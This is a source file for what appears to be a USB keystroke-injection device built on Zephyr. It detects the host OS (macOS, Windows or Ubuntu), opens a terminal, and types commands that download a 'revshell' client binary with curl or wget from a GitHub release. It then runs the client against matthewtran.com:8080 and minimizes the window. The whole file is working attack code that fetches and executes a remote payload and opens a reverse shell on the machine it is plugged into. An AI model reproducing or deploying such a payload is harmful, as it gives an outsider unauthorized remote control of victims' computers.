#include "common.h"

// deploys binary payload in a very detectable way :P

extern "C" void run(void) {
    switch (hid_get_os()) {
        case hid_os::MACOS: {
            rgb_write(rgb_color::GREEN);
            kb_type(HID_KEY_SPACE, HID_KBD_MODIFIER_LEFT_UI);
            k_msleep(100);
            kb_print("Terminal.app");
            kb_type(HID_KEY_ENTER, 0);
            k_msleep(2000);
            kb_print("cd Downloads");
            kb_type(HID_KEY_ENTER, 0);
            kb_print("curl -L -o client https://github.com/dragonlock2/zephyrboards/releases/download/revshell/macos-13-client");
            kb_type(HID_KEY_ENTER, 0); // macos-13 is x86_64 binary
            k_msleep(5000);
            kb_print("chmod +x client");
            kb_type(HID_KEY_ENTER, 0);
            k_msleep(100);
            kb_print("./client matthewtran.com:8080"); // TODO run detached
            kb_type(HID_KEY_ENTER, 0);
            k_msleep(100);
            kb_type(HID_KEY_M, HID_KBD_MODIFIER_LEFT_UI); // minimize window for now
            break;
        }
        case hid_os::WINDOWS: {
            rgb_write(rgb_color::BLUE);
            kb_type(HID_KEY_R, HID_KBD_MODIFIER_LEFT_UI);
            k_msleep(100);
            kb_print("powershell.exe");
            kb_type(HID_KEY_ENTER, 0);
            k_msleep(1000);
            kb_print("cd Downloads");
            kb_type(HID_KEY_ENTER, 0);
            kb_print("curl -o client.exe https://github.com/dragonlock2/zephyrboards/releases/download/revshell/windows-latest-client.exe");
            kb_type(HID_KEY_ENTER, 0); // curl is preinstalled on recent Windows
            k_msleep(5000);
            kb_print("./client.exe matthewtran.com:8080"); // TODO run detached
            kb_type(HID_KEY_ENTER, 0);
            k_msleep(100);
            kb_type(HID_KEY_DOWN, HID_KBD_MODIFIER_LEFT_UI); // minimize window for now
            break;
        }
        case hid_os::LINUX: { // Ubuntu
            rgb_write(rgb_color::RED);
            kb_type(HID_KEY_T, HID_KBD_MODIFIER_LEFT_CTRL | HID_KBD_MODIFIER_LEFT_ALT);
            k_msleep(1000);
            kb_print("cd Downloads");
            kb_type(HID_KEY_ENTER, 0);
            kb_print("wget -O client https://github.com/dragonlock2/zephyrboards/releases/download/revshell/ubuntu-latest-client");
            kb_type(HID_KEY_ENTER, 0); // wget is preinstalled on Ubuntu
            k_msleep(5000);
            kb_print("chmod +x client");
            kb_type(HID_KEY_ENTER, 0);
            k_msleep(100);
            kb_print("./client matthewtran.com:8080"); // TODO run detached
            kb_type(HID_KEY_ENTER, 0);
            k_msleep(100);
            kb_type(HID_KEY_H, HID_KBD_MODIFIER_LEFT_UI); // minimize window for now
            break;
        }
        default: {
            printk("unknown os");
            while (true) {
                rgb_write(rgb_color::YELLOW);
                k_msleep(100);
                rgb_write(rgb_color::OFF);
                k_msleep(100);
            }
            break;
        }
    }
}

LL_EXTENSION_SYMBOL(run);
